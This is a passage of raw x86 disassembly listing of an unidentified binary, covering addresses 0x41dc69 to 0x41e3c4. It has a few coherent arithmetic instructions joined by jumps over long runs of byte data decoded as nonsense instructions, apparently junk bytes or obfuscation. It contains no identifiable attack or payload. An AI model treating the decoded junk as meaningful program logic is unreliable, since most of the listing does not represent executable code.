  41dc69:	xor    edx,0x30469538
  41dc6f:	jmp    0x41dd3b
  41dc74:	inc    ebp
  41dc75:	stc    
  41dc76:	ss xor al,0xbe
  41dc79:	inc    DWORD PTR [edi-0x7]
  41dc7c:	les    edi,FWORD PTR [ebx-0x2a]
  41dc7f:	cmp    DWORD PTR [edx],esi
  41dc81:	jns    0x41dc58
  41dc83:	in     al,0xdf
  41dc85:	pop    edx
  41dc86:	add    DWORD PTR [eax],eax
  41dc88:	scas   eax,DWORD PTR es:[edi]
  41dc89:	add    BYTE PTR [eax],al
  41dc8b:	add    BYTE PTR [esi+0x48193c81],cl
  41dc91:	adc    esp,esi
  41dc93:	(bad)
  41dc97:	ss rcl ch,1
  41dc9a:	sbb    cl,BYTE PTR [edi+0x79]
  41dc9d:	pop    edi
  41dc9e:	sbb    edi,DWORD PTR [eax]
  41dca0:	and    al,0x8f
  41dca2:	test   al,0x1a
  41dca4:	mov    ebp,ebx
  41dca6:	mov    eax,0x64d31b09
  41dcab:	xor    al,0x85
  41dcad:	ins    BYTE PTR es:[edi],dx
  41dcae:	add    al,bl
  41dcb0:	dec    edx
  41dcb1:	adc    BYTE PTR [esi-0x73],bh
  41dcb4:	and    ebx,edx
  41dcb6:	cmp    BYTE PTR [ebp+0x61],dh
  41dcb9:	test   eax,0x9038aef5
  41dcbe:	out    dx,al
  41dcbf:	inc    edi
  41dcc0:	retf   0x10ce
  41dcc3:	lods   al,BYTE PTR ds:[esi]
  41dcc4:	dec    ebp
  41dcc5:	imul   ebx,eax,0xd8360799
  41dccb:	ds (bad) 
  41dccd:	mov    ds:0x82ffea72,al
  41dcd2:	dec    eax
  41dcd3:	jnp    0x41dd18
  41dcd5:	retf   
  41dcd6:	push   esi
  41dcd7:	sbb    DWORD PTR [edx+0x1a],esi
  41dcda:	(bad)  
  41dcdb:	pop    edi
  41dcdc:	lahf   
  41dcdd:	icebp  
  41dcde:	pop    ecx
  41dcdf:	sub    BYTE PTR [ebx],dl
  41dce1:	(bad)  [ebp-0x38]
  41dce4:	dec    eax
  41dce5:	push   cs
  41dce6:	or     eax,0xe1f2302c
  41dceb:	fld    TBYTE PTR [esi-0x44]
  41dcee:	clc    
  41dcef:	mov    esp,0xa9d69dcb
  41dcf4:	in     eax,0x3c
  41dcf6:	cwde   
  41dcf7:	cli    
  41dcf8:	sti    
  41dcf9:	xor    eax,0xa8df2c25
  41dcfe:	or     bl,BYTE PTR [esi+0x7ee7719d]
  41dd04:	jno    0x41dcd5
  41dd06:	retf   
  41dd07:	push   es
  41dd08:	mov    WORD PTR [ebx],es
  41dd0a:	mov    ecx,0x60db05b
  41dd0f:	fnstsw WORD PTR [esi+esi*1-0x425421aa]
  41dd16:	mov    esp,0xb077e8d7
  41dd1b:	sub    DWORD PTR [eax+0x78f6ba44],esp
  41dd21:	jecxz  0x41dd3a
  41dd23:	cli    
  41dd24:	gs and eax,0x2765c1b6
  41dd2a:	inc    edi
  41dd2b:	or     BYTE PTR [ecx],ah
  41dd2d:	add    al,0xb5
  41dd2f:	and    eax,0xd919ce42
  41dd34:	jecxz  0x41dd66
  41dd36:	push   cs
  41dd37:	out    dx,al
  41dd38:	fdiv   QWORD PTR [edi-0x37]
  41dd3b:	add    ecx,edx
  41dd3d:	mov    edx,DWORD PTR [ebp-0x2c]
  41dd40:	shr    eax,1
  41dd42:	or     eax,edx
  41dd44:	mov    edx,DWORD PTR [ebp-0x30]
  41dd47:	imul   eax,edx
  41dd4a:	xor    edx,edx
  41dd4c:	jmp    0x41de18
  41dd51:	jmp    0x41ddba
  41dd53:	adc    BYTE PTR [esi],dl
  41dd55:	pushf  
  41dd56:	ja     0x41dd47
  41dd58:	dec    DWORD PTR [ecx-0x3a]
  41dd5b:	sub    cl,BYTE PTR [esi+0x10]
  41dd5e:	xor    BYTE PTR [ecx+0x15b8ebf],0x0
  41dd65:	scas   eax,DWORD PTR es:[edi]
  41dd66:	add    BYTE PTR [eax],al
  41dd68:	add    cl,bl
  41dd6a:	das    
  41dd6b:	adc    dh,BYTE PTR [bx+di]
  41dd6e:	or     al,0xcc
  41dd70:	jecxz  0x41ddbb
  41dd72:	into   
  41dd73:	inc    ecx
  41dd74:	and    dh,cl
  41dd76:	xchg   ah,ah
  41dd78:	xor    BYTE PTR [eax-0x43c3ba71],bl
  41dd7e:	stos   BYTE PTR es:[edi],al
  41dd7f:	pop    esi
  41dd80:	fs int 0xe2
  41dd83:	in     al,dx
  41dd84:	mov    ch,0xe6
  41dd86:	add    eax,0x92e95740
  41dd8b:	pop    esi
  41dd8c:	mov    ch,0x35
  41dd8e:	fidiv  WORD PTR [edx]
  41dd90:	cli    
  41dd91:	popa   
  41dd92:	push   esp
  41dd93:	push   0x57717dd8
  41dd98:	retf   
  41dd99:	adc    BYTE PTR [esi],bl
  41dd9b:	add    bl,BYTE PTR [esi-0x30]
  41dd9e:	popa   
  41dd9f:	or     ah,bh
  41dda1:	pusha  
  41dda2:	sbb    eax,DWORD PTR [edi-0x2422f3a9]
  41dda8:	sti    
  41dda9:	(bad)  
  41ddaa:	mov    esp,0x2379f040
  41ddaf:	mov    eax,0x7124a558
  41ddb4:	sbb    eax,0x5e7be2ae
  41ddb9:	sub    BYTE PTR [ebp+0x45],dl
  41ddbc:	jle    0x41ddc3
  41ddbe:	inc    edx
  41ddbf:	jp     0x41de21
  41ddc1:	aas    
  41ddc2:	jb     0x41dd7d
  41ddc4:	push   ebx
  41ddc5:	push   esp
  41ddc6:	sbb    dh,BYTE PTR [ebx+0x53]
  41ddc9:	test   DWORD PTR [edx],esi
  41ddcb:	adc    eax,0x6b53e8ce
  41ddd0:	arpl   WORD PTR [ecx-0x61af0a74],ax
  41ddd6:	and    BYTE PTR [ebp-0x66],al
  41ddd9:	and    eax,DWORD PTR [eax]
  41dddb:	jmp    0x41de2b
  41dddd:	push   cs
  41ddde:	sub    bh,BYTE PTR [ebx+0x79b5d4c9]
  41dde4:	test   al,0x1c
  41dde6:	rcl    BYTE PTR [esi-0x47],0x91
  41ddea:	test   al,0x69
  41ddec:	inc    edx
  41dded:	imul   BYTE PTR [edx-0x2c]
  41ddf0:	mov    ah,0x17
  41ddf2:	gs aaa 
  41ddf4:	mov    ah,0x14
  41ddf6:	pop    es
  41ddf7:	es pop dx
  41ddfa:	cmp    esp,esi
  41ddfc:	dec    edx
  41ddfd:	sbb    eax,0xd4ad175c
  41de02:	jne    0x41de63
  41de04:	adc    al,0x3c
  41de06:	mov    bh,0x6b
  41de08:	pop    eax
  41de09:	jne    0x41de55
  41de0b:	adc    BYTE PTR [esp+ebx*2+0x30a420c7],bh
  41de12:	push   eax
  41de13:	cwde   
  41de14:	dec    esi
  41de15:	sar    BYTE PTR [esi-0x39],0xbf
  41de19:	mov    edi,0xf700004a
  41de1e:	imul   ecx
  41de20:	mov    DWORD PTR [eax],0x67140000
  41de26:	dec    ecx
  41de27:	jo     0x41dea4
  41de29:	jle    0x41de68
  41de2b:	addr16 dec edi
  41de2d:	dec    ecx
  41de2e:	mov    esp,esp
  41de30:	(bad)  
  41de31:	hlt    
  41de32:	inc    ecx
  41de33:	pop    ecx
  41de34:	cmp    eax,0xaf00015c
  41de39:	add    BYTE PTR [eax],al
  41de3b:	add    dh,dl
  41de3d:	and    ebx,DWORD PTR [eax]
  41de3f:	jns    0x41de71
  41de41:	shl    BYTE PTR [edx],cl
  41de43:	mov    cl,0xd9
  41de45:	and    al,0x59
  41de47:	adc    al,0xaf
  41de49:	jb     0x41de97
  41de4b:	push   0x1a
  41de4d:	mov    gs,WORD PTR [eax-0x4d659508]
  41de53:	dec    edx
  41de54:	fistp  DWORD PTR [edi-0x1e693614]
  41de5a:	pop    ss
  41de5b:	addr16 into 
  41de5d:	repz mov bh,0x12
  41de60:	pop    edx
  41de61:	repz daa 
  41de63:	es daa 
  41de65:	es push 0xb5e056fa
  41de6b:	dec    edi
  41de6c:	push   esi
  41de6d:	push   ebx
  41de6e:	out    dx,al
  41de6f:	push   esi
  41de70:	ins    BYTE PTR es:[edi],dx
  41de71:	xchg   ecx,eax
  41de72:	mov    ds:0x24edc4ac,eax
  41de77:	in     eax,dx
  41de78:	repnz cld 
  41de7a:	mov    cl,0x9
  41de7c:	jmp    0x4fcb3c42
  41de81:	call   0xe40f:0x25ed1c79
  41de88:	(bad)  
  41de89:	xor    BYTE PTR [edi-0x60],bh
  41de8c:	aam    0x8d
  41de8e:	lds    edi,FWORD PTR [esi-0x5e]
  41de91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de92:	pop    ebx
  41de93:	fisttp DWORD PTR [esi]
  41de95:	aaa    
  41de96:	jecxz  0x41de45
  41de98:	ds ins DWORD PTR es:[edi],dx
  41de9a:	and    eax,0x2edc320
  41de9f:	mov    ch,0x14
  41dea1:	mov    al,BYTE PTR [edi]
  41dea3:	lds    ecx,FWORD PTR [edi+ebp*4]
  41dea6:	push   ss
  41dea7:	rcl    BYTE PTR [edx-0x27],cl
  41deaa:	dec    eax
  41deab:	hlt    
  41deac:	mov    ah,al
  41deae:	out    0xd2,al
  41deb0:	xor    BYTE PTR [ecx],al
  41deb2:	icebp  
  41deb3:	je     0x41de58
  41deb5:	leave  
  41deb6:	dec    esp
  41deb7:	in     al,dx
  41deb8:	sbb    BYTE PTR [ebx-0x1c],0x7b
  41debc:	dec    edi
  41debd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41debe:	inc    ebp
  41debf:	lock (bad) 
  41dec1:	imul   esp,DWORD PTR [ebp+0x1700dac],0xfbdee469
  41decb:	xchg   ecx,edi
  41decd:	push   esi
  41dece:	(bad)  
  41decf:	and    al,0xc3
  41ded1:	jle    0x41de5b
  41ded3:	je     0x41deaa
  41ded5:	push   ds
  41ded6:	xlat   BYTE PTR ds:[ebx]
  41ded7:	aaa    
  41ded8:	js     0x41defe
  41deda:	out    0xf6,al
  41dedc:	or     esi,DWORD PTR [edx]
  41dede:	jmp    0xba190c0b
  41dee3:	mov    ebx,0x4cb2d3a2
  41dee8:	lods   eax,DWORD PTR ds:[esi]
  41dee9:	mov    esp,0xe9f98b7a
  41deee:	mov    DWORD PTR [eax],0x20ba0000
  41def4:	sbb    eax,0xbfbd9f98
  41def9:	and    ah,BYTE PTR [esp+eiz*4]
  41defc:	mov    ch,0x74
  41defe:	push   0xec39cf30
  41df03:	pop    esp
  41df04:	add    DWORD PTR [eax],eax
  41df06:	scas   eax,DWORD PTR es:[edi]
  41df07:	add    BYTE PTR [eax],al
  41df09:	add    BYTE PTR [edx],cl
  41df0b:	adc    eax,DWORD PTR [edi]
  41df0d:	mov    esp,ebx
  41df0f:	(bad)  
  41df10:	setb   BYTE PTR [eax]
  41df13:	ja     0x41df90
  41df15:	ins    BYTE PTR es:[edi],dx
  41df16:	in     al,dx
  41df17:	into   
  41df18:	das    
  41df19:	and    DWORD PTR [edx],eax
  41df1b:	mov    esp,0x5a2f0e31
  41df20:	std    
  41df21:	retf   0x3f81
  41df24:	lods   al,BYTE PTR ds:[esi]
  41df25:	mov    edx,0x47b0fb94
  41df2a:	fcom   QWORD PTR [ebp-0x7e]
  41df2d:	mov    bh,0xcf
  41df2f:	jno    0x41dede
  41df31:	shl    DWORD PTR [ebp+0x7],cl
  41df34:	adc    dh,BYTE PTR [ebp+0x514e1f99]
  41df3a:	adc    BYTE PTR [ecx-0x3dde0],bl
  41df40:	xchg   edx,eax
  41df41:	inc    esp
  41df42:	not    BYTE PTR [ebp+0x37]
  41df45:	enter  0x6e0c,0x6c
  41df49:	pop    es
  41df4a:	aas    
  41df4b:	test   al,0x66
  41df4d:	or     bl,dh
  41df4f:	mov    eax,ds:0x4e7bbc36
  41df54:	mov    edx,0x4f84971f
  41df59:	push   edi
  41df5a:	xlat   BYTE PTR ds:[ebx]
  41df5b:	push   esi
  41df5c:	daa    
  41df5d:	pop    ds
  41df5e:	xor    al,0x1b
  41df60:	(bad)  
  41df61:	dec    edx
  41df62:	hlt    
  41df63:	push   eax
  41df64:	and    al,0xdf
  41df66:	sub    dl,dh
  41df68:	inc    edi
  41df69:	ja     0x41def2
  41df6b:	inc    esp
  41df6c:	push   cs
  41df6d:	outs   dx,BYTE PTR ds:[esi]
  41df6e:	repz ja 0x41dfa5
  41df71:	inc    eax
  41df72:	jmp    0x41defa
  41df74:	pop    ds
  41df75:	adc    DWORD PTR [edi*4-0x46189268],edx
  41df7c:	imul   BYTE PTR [ecx-0x54387a7c]
  41df82:	scas   eax,DWORD PTR es:[edi]
  41df83:	xchg   edi,eax
  41df84:	jne    0x41df8d
  41df86:	jl     0x41dff5
  41df88:	in     eax,dx
  41df89:	push   ecx
  41df8a:	mov    esp,0x1c8b563
  41df8f:	iret   
  41df90:	daa    
  41df91:	dec    ecx
  41df92:	push   0x2f
  41df94:	cmp    DWORD PTR [esi+0x7b],esp
  41df97:	in     eax,dx
  41df98:	xchg   edi,eax
  41df99:	in     eax,0xe3
  41df9b:	xchg   ebx,eax
  41df9c:	(bad)  
  41df9d:	fdiv   DWORD PTR [esi+0x56]
  41dfa0:	xchg   edi,eax
  41dfa1:	inc    esi
  41dfa2:	xchg   BYTE PTR [esi+eiz*4],dh
  41dfa5:	fadd   DWORD PTR [eax-0x14f28031]
  41dfab:	jge    0x41df94
  41dfad:	ror    DWORD PTR [edx+0x1a],1
  41dfb0:	sti    
  41dfb1:	data16 xchg BYTE PTR [esi],bh
  41dfb4:	pop    ecx
  41dfb5:	xchg   dl,bl
  41dfb7:	xlat   BYTE PTR es:[ebx]
  41dfb9:	xor    edx,edx
  41dfbb:	sub    edi,eax
  41dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  41dfc0:	sub    edi,eax
  41dfc2:	jmp    0x41e08e
  41dfc7:	data16 (bad) 
  41dfc9:	xchg   ebx,eax
  41dfca:	fstp   QWORD PTR [ebx-0x4a009103]
  41dfd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd1:	xlat   BYTE PTR ds:[ebx]
  41dfd2:	add    dl,dl
  41dfd4:	imul   DWORD PTR [ebp+0x1c]
  41dfd7:	fwait
  41dfd8:	pop    ebp
  41dfd9:	add    DWORD PTR [eax],eax
  41dfdb:	scas   eax,DWORD PTR es:[edi]
  41dfdc:	add    BYTE PTR [eax],al
  41dfde:	add    BYTE PTR ds:0xce4a07f0,cl
  41dfe4:	(bad)  
  41dfe5:	int3   
  41dfe6:	jno    0x41df71
  41dfe8:	jno    0x41dfd5
  41dfea:	(bad)  
  41dfeb:	xor    ebx,DWORD PTR [ebx]
  41dfed:	(bad)  
  41dfee:	paddsb mm6,QWORD PTR [ecx]
  41dff1:	les    esi,FWORD PTR [eax]
  41dff3:	enter  0xb27d,0xae
  41dff7:	inc    ebp
  41dff8:	in     eax,0xe9
  41dffa:	cmp    BYTE PTR [esi-0x24],al
  41dffd:	in     al,dx
  41dffe:	in     al,0x93
  41e000:	cmp    BYTE PTR [ebx-0xdd4ea42],bl
  41e006:	lock (bad) 
  41e008:	pop    ebp
  41e009:	and    ch,BYTE PTR [ebx+0x33]
  41e00c:	add    BYTE PTR [ebp-0x5df4042e],0x2f
  41e013:	sub    DWORD PTR [ebx],edi
  41e015:	push   ebx
  41e016:	and    ebp,DWORD PTR [eax+ebp*1-0x1b3a8e84]
  41e01d:	jns    0x41e087
  41e01f:	hlt    
  41e020:	or     ebp,DWORD PTR ds:0xd8c35e83
  41e026:	push   esp
  41e027:	out    dx,eax
  41e028:	(bad)  
  41e029:	jl     0x41dff8
  41e02b:	mov    esi,0x19ab1e6f
  41e030:	mov    edx,0xae01a143
  41e035:	dec    esp
  41e036:	mov    ah,0xd9
  41e038:	loope  0x41e011
  41e03a:	stos   DWORD PTR es:[edi],eax
  41e03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e03c:	lods   al,BYTE PTR ds:[esi]
  41e03d:	test   eax,0x4fcbe03a
  41e042:	sbb    DWORD PTR [ecx+0x5e589153],esi
  41e048:	fxch   st(6)
  41e04a:	sub    DWORD PTR [esi],ebp
  41e04c:	outs   dx,DWORD PTR ds:[esi]
  41e04d:	jb     0x41dfe7
  41e04f:	sbb    bl,dh
  41e051:	(bad)  
  41e052:	add    al,0xec
  41e054:	out    dx,al
  41e055:	mov    edi,0xfc3f08ec
  41e05a:	js     0x41e081
  41e05c:	jnp    0x41e0b0
  41e05e:	fist   DWORD PTR [edx+edx*1-0x5f]
  41e062:	call   0x482f:0xe8a51a7a
  41e069:	mov    bl,0x48
  41e06b:	xchg   esp,eax
  41e06c:	(bad)  
  41e06d:	adc    eax,0xfddd309a
  41e072:	ss das 
  41e074:	leave  
  41e075:	push   esp
  41e076:	aad    0x2a
  41e078:	or     edi,0x21
  41e07b:	iret   
  41e07c:	js     0x41e038
  41e07e:	rol    BYTE PTR [edx+eiz*8],cl
  41e081:	xor    dl,BYTE PTR [edi-0x12]
  41e084:	xchg   esi,eax
  41e085:	loopne 0x41e0ec
  41e087:	fisttp WORD PTR [eax+0x63]
  41e08a:	adc    BYTE PTR [ebx+0x64],cl
  41e08d:	outs   dx,BYTE PTR ds:[esi]
  41e08e:	mov    eax,DWORD PTR [ebp-0x38]
  41e091:	imul   eax,eax,0x65d2
  41e097:	div    ebx
  41e099:	mov    edx,DWORD PTR [ebp-0x3c]
  41e09c:	add    edi,0x6d14
  41e0a2:	lea    eax,[eax+edx*1+0x132a]
  41e0a9:	jmp    0x41e175
  41e0ae:	xor    esp,ebx
  41e0b0:	div    BYTE PTR [eax]
  41e0b2:	div    BYTE PTR ds:0xfcbce3f7
  41e0b8:	xor    ah,ah
  41e0ba:	into   
  41e0bb:	jle    0x41e0cb
  41e0bd:	mov    eax,ds:0x15e4a
  41e0c2:	scas   eax,DWORD PTR es:[edi]
  41e0c3:	add    BYTE PTR [eax],al
  41e0c5:	add    BYTE PTR [esi+0x6d],dh
  41e0c8:	popa   
  41e0c9:	push   ecx
  41e0ca:	test   al,0x7e
  41e0cc:	sub    eax,0xddd531f5
  41e0d1:	dec    DWORD PTR [esp+ebx*8-0x70eb6e6f]
  41e0d8:	ins    DWORD PTR es:[edi],dx
  41e0d9:	iret   
  41e0da:	retf   0x8125
  41e0dd:	fisub  DWORD PTR [esi]
  41e0df:	dec    edx
  41e0e0:	cmp    DWORD PTR [esp+ecx*1],eax
  41e0e3:	fcom   DWORD PTR [ecx]
  41e0e5:	(bad)  
  41e0e6:	push   0x46
  41e0e8:	psllw  mm4,QWORD PTR [esi-0x3428a071]
  41e0ef:	clc    
  41e0f0:	cs cwde 
  41e0f2:	cdq    
  41e0f3:	jmp    FWORD PTR [eax]
  41e0f5:	mov    ss,ebp
  41e0f7:	jp     0x41e0c9
  41e0f9:	xor    al,0xdc
  41e0fb:	mov    ebx,0x8a2a9a50
  41e100:	out    dx,eax
  41e101:	mov    ecx,0xdc5eb3cb
  41e106:	inc    ebp
  41e107:	(bad)  
  41e108:	mov    eax,0x6299f5cc
  41e10d:	es mov edx,0xc66f949d
  41e113:	adc    al,0xfe
  41e115:	rol    DWORD PTR [eax+0x46440e1c],0xce
  41e11c:	ror    BYTE PTR [esi+0x13a5ae98],1
  41e122:	xchg   ebx,eax
  41e123:	imul   ecx,DWORD PTR [esi],0x9f046ff9
  41e129:	ins    BYTE PTR es:[edi],dx
  41e12a:	sbb    al,0x8e
  41e12c:	clc    
  41e12d:	xchg   ebp,eax
  41e12e:	aam    0x0
  41e130:	add    esi,ebp
  41e132:	push   ebp
  41e133:	scas   eax,DWORD PTR es:[edi]
  41e134:	jo     0x41e133
  41e136:	stos   DWORD PTR es:[edi],eax
  41e137:	add    eax,0xb1be971e
  41e13c:	jne    0x41e0e7
  41e13e:	push   cs
  41e13f:	sbb    al,0x9f
  41e141:	push   cs
  41e142:	pop    DWORD PTR [ebx+0x31]
  41e145:	(bad)  
  41e146:	or     dh,BYTE PTR [edi+0x7]
  41e149:	out    dx,eax
  41e14a:	cmp    BYTE PTR [ebp-0x790bc7e0],0x69
  41e151:	mov    esi,DWORD PTR [ecx+0xd]
  41e154:	ja     0x41e114
  41e156:	ret    0xcec7
  41e159:	jp     0x41e1aa
  41e15b:	inc    ebx
  41e15c:	cli    
  41e15d:	jae    0x41e18f
  41e15f:	jmp    0x41e0ed
  41e161:	rcr    DWORD PTR [esi],cl
  41e163:	jns    0x41e16e
  41e165:	sbb    eax,0x153c70cf
  41e16a:	xchg   BYTE PTR [edi-0x7d4c262],bl
  41e170:	jbe    0x41e1bd
  41e172:	sti    
  41e173:	mov    al,0x2c
  41e175:	mov    edx,DWORD PTR [ebp+0x10]
  41e178:	jmp    0x41e244
  41e17d:	inc    ebp
  41e17e:	jne    0x41e18a
  41e180:	out    0x3a,al
  41e182:	(bad)  
  41e183:	in     eax,dx
  41e184:	div    esi
  41e186:	xchg   edx,eax
  41e187:	cdq    
  41e188:	cmp    esp,edx
  41e18a:	gs inc edi
  41e18c:	pop    edi
  41e18d:	stc    
  41e18e:	pop    esi
  41e18f:	add    DWORD PTR [eax],eax
  41e191:	scas   eax,DWORD PTR es:[edi]
  41e192:	add    BYTE PTR [eax],al
  41e194:	add    ah,bl
  41e196:	and    BYTE PTR [ebx+esi*4],bh
  41e199:	or     eax,0x4d05a3d7
  41e19e:	outs   dx,DWORD PTR ds:[esi]
  41e19f:	test   DWORD PTR [edi],ecx
  41e1a1:	or     BYTE PTR [esi+0x49],al
  41e1a4:	fwait
  41e1a5:	loop   0x41e132
  41e1a7:	cli    
  41e1a8:	inc    DWORD PTR [ecx+0x40499b5f]
  41e1ae:	or     BYTE PTR [edx-0x5b],cl
  41e1b1:	add    dh,BYTE PTR [edx+0x4101c70b]
  41e1b7:	mov    ebx,?
  41e1b9:	out    dx,eax
  41e1ba:	xchg   edx,eax
  41e1bb:	dec    DWORD PTR [eax-0x421553e4]
  41e1c1:	or     ebx,DWORD PTR [esi-0x5141cb3c]
  41e1c7:	pop    edi
  41e1c8:	pop    eax
  41e1c9:	dec    esi
  41e1ca:	adc    ebx,0x1dcdbfa9
  41e1d0:	pop    ds
  41e1d1:	ror    BYTE PTR [eax-0xa],cl
  41e1d4:	jp     0x41e172
  41e1d6:	outs   dx,DWORD PTR ds:[esi]
  41e1d7:	sar    edx,0x58
  41e1da:	daa    
  41e1db:	outs   dx,BYTE PTR ds:[esi]
  41e1dc:	inc    ebp
  41e1dd:	call   0x4dfd:0xe98d12a4
  41e1e4:	mov    al,ds:0x3b35ea37
  41e1e9:	add    DWORD PTR [ecx+ecx*1-0x34],0xffffffed
  41e1ee:	xor    BYTE PTR [esi+0x5ea6913d],bl
  41e1f4:	leave  
  41e1f5:	cmp    ah,al
  41e1f7:	iret   
  41e1f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f9:	cwde   
  41e1fa:	fnstcw WORD PTR [esi]
  41e1fc:	or     esi,esp
  41e1fe:	aaa    
  41e1ff:	mov    ds,esp
  41e201:	sbb    DWORD PTR [eax],esp
  41e203:	cmp    eax,0x5ca5c328
  41e208:	in     eax,0x9a
  41e20a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e20b:	inc    edi
  41e20c:	sbb    eax,0xf428a6bb
  41e211:	mov    ecx,0xce4262b7
  41e216:	sbb    eax,0xd0ee37e7
  41e21b:	ja     0x41e1be
  41e21d:	sbb    eax,ecx
  41e21f:	jno    0x41e1e9
  41e221:	sub    edx,DWORD PTR [ecx+0x3]
  41e224:	jns    0x41e20c
  41e226:	dec    edx
  41e227:	push   ebp
  41e228:	fidivr WORD PTR [eax+0x368b9e7]
  41e22e:	lods   al,BYTE PTR ds:[esi]
  41e22f:	rcl    DWORD PTR ds:0x4c76ef3b,0x19
  41e237:	pop    eax
  41e238:	repz and bl,0x59
  41e23c:	cwde   
  41e23d:	dec    esp
  41e23e:	sbb    BYTE PTR [ebp+0x67],bh
  41e241:	or     ebx,DWORD PTR [esi-0x70daca11]
  41e247:	add    BYTE PTR [eax],al
  41e249:	sub    edx,eax
  41e24b:	jmp    0x41e317
  41e250:	and    ecx,DWORD PTR [edi-0x3f]
  41e253:	call   0xe9cf:0xff7b9eed
  41e25a:	aam    0x9f
  41e25c:	sbb    ebp,esi
  41e25e:	fisubr WORD PTR cs:[eax-0x50fffea1]
  41e265:	add    BYTE PTR [eax],al
  41e267:	add    bh,bl
  41e269:	jb     0x41e263
  41e26b:	fdiv   QWORD PTR [ecx+0x1f]
  41e26e:	sub    eax,0x36463304
  41e273:	lods   eax,DWORD PTR ds:[esi]
  41e274:	add    DWORD PTR [esi],ebp
  41e276:	sar    BYTE PTR [edi-0x6b],0x33
  41e27a:	pop    es
  41e27b:	les    edi,FWORD PTR [edi+esi*2+0x76799561]
  41e282:	adc    DWORD PTR [edx+0x44bc5a1f],0xd1d0a2a2
  41e28c:	dec    BYTE PTR [eax-0x76]
  41e28f:	push   ecx
  41e290:	xor    BYTE PTR [ebp-0x3a],dh
  41e293:	xor    eax,0xa46b37cb
  41e298:	outs   dx,BYTE PTR ds:[esi]
  41e299:	mov    ebp,0xc8ff8b6e
  41e29e:	xchg   ecx,eax
  41e29f:	push   eax
  41e2a0:	repnz xchg esp,eax
  41e2a2:	mov    ebx,0x4db7fe8a
  41e2a7:	sbb    DWORD PTR [esi],eax
  41e2a9:	data16 neg ah
  41e2ac:	retf   0x816c
  41e2af:	mov    BYTE PTR [edi+0x4],bh
  41e2b2:	sbb    al,0x48
  41e2b4:	xchg   DWORD PTR [ebx+0x34963d89],ebp
  41e2ba:	scas   eax,DWORD PTR es:[edi]
  41e2bb:	icebp  
  41e2bc:	sbb    bh,dh
  41e2be:	fst    DWORD PTR [ebp-0x75edd974]
  41e2c4:	inc    ebx
  41e2c5:	vaddsubpd ymm0,ymm6,ymm5
  41e2c9:	popf   
  41e2ca:	jbe    0x41e33a
  41e2cc:	mov    esp,0x9d02678a
  41e2d1:	ror    BYTE PTR [edx],1
  41e2d3:	mov    ds:0x5bd54047,al
  41e2d8:	xor    DWORD PTR [esi+0x2e],esp
  41e2db:	outs   dx,BYTE PTR ds:[esi]
  41e2dc:	pop    edx
  41e2dd:	cmp    al,0x76
  41e2df:	push   ecx
  41e2e0:	pusha  
  41e2e1:	fcom   DWORD PTR [ecx+0x63]
  41e2e4:	test   DWORD PTR ds:0x40b79ab3,edx
  41e2ea:	mov    esp,0x1b12d063
  41e2ef:	lods   eax,DWORD PTR ds:[esi]
  41e2f0:	pop    ss
  41e2f1:	xchg   DWORD PTR ds:0x8701427a,ebx
  41e2f7:	mov    esp,0x30f6820b
  41e2fc:	retf   0xdbc7
  41e2ff:	outs   dx,DWORD PTR ds:[esi]
  41e300:	jmp    0xc2bc8096
  41e305:	push   ecx
  41e306:	std    
  41e307:	pop    esp
  41e308:	jae    0x41e341
  41e30a:	nop
  41e30b:	out    dx,eax
  41e30c:	mov    bl,0x6
  41e30e:	fisttp WORD PTR [ecx]
  41e310:	stc    
  41e311:	and    edx,0xe1532cd8
  41e317:	cmp    edi,edx
  41e319:	jbe    0x41d4b7
  41e31f:	jmp    0x41e3eb
  41e324:	les    edx,FWORD PTR [edi+ebx*8]
  41e327:	rcr    bh,0xcb
  41e32a:	fist   WORD PTR [esi+esi*4]
  41e32d:	ins    DWORD PTR es:[edi],dx
  41e32e:	fcom   QWORD PTR [edx+0x5f6eb155]
  41e334:	push   edi
  41e335:	pusha  
  41e336:	add    DWORD PTR [eax],eax
  41e338:	scas   eax,DWORD PTR es:[edi]
  41e339:	add    BYTE PTR [eax],al
  41e33b:	add    BYTE PTR ds:0x53c3d4c7,dl
  41e341:	pop    edx
  41e342:	loopne 0x41e32c
  41e344:	add    ch,0xa7
  41e347:	ret    
  41e348:	fsub   QWORD PTR [eax+0x19]
  41e34b:	and    ch,ah
  41e34d:	mov    ds:0x68765912,al
  41e352:	scas   eax,DWORD PTR es:[edi]
  41e353:	sub    DWORD PTR [edi],ecx
  41e355:	lea    ecx,[ebp-0x205227e6]
  41e35b:	dec    ebp
  41e35c:	mov    ds:0x2864c6cc,al
  41e361:	pop    esi
  41e362:	shl    DWORD PTR [esi-0x19],1
  41e365:	lock mov esi,0x24595eb2
  41e36b:	test   BYTE PTR [eax+0x2a],ch
  41e36e:	dec    esp
  41e36f:	shl    DWORD PTR [edx+edx*8],cl
  41e372:	jnp    0x41e304
  41e374:	dec    esi
  41e375:	pop    ss
  41e376:	aaa    
  41e377:	jecxz  0x41e3da
  41e379:	and    BYTE PTR [edx-0x53],al
  41e37c:	mov    al,0x2e
  41e37e:	push   0xffffffca
  41e380:	add    al,BYTE PTR [ecx-0x7d351932]
  41e386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e387:	loop   0x41e3e6
  41e389:	stc    
  41e38a:	loope  0x41e3cb
  41e38c:	enter  0x91c3,0x4e
  41e390:	pop    ebp
  41e391:	daa    
  41e392:	sbb    eax,0x58e30752
  41e397:	sti    
  41e398:	xchg   ebp,eax
  41e399:	jns    0x41e37f
  41e39b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e39c:	push   edx
  41e39d:	lahf   
  41e39e:	repz inc edx
  41e3a0:	inc    edx
  41e3a1:	(bad)  
  41e3a2:	pfcmpge mm5,mm1
  41e3a6:	rcr    cl,cl
  41e3a8:	mov    al,0x4b
  41e3aa:	mov    dl,0x4f
  41e3ac:	pushf  
  41e3ad:	sbb    BYTE PTR [ebp+0x19],0xbb
  41e3b1:	cmp    eax,0x79e67767
  41e3b6:	mov    ds:0x397178c6,eax
  41e3bb:	inc    edi
  41e3bc:	jbe    0x41e353
  41e3be:	jns    0x41e412
  41e3c0:	(bad)  
  41e3c1:	retf   0xc6f1
  41e3c4:	dec    ebp
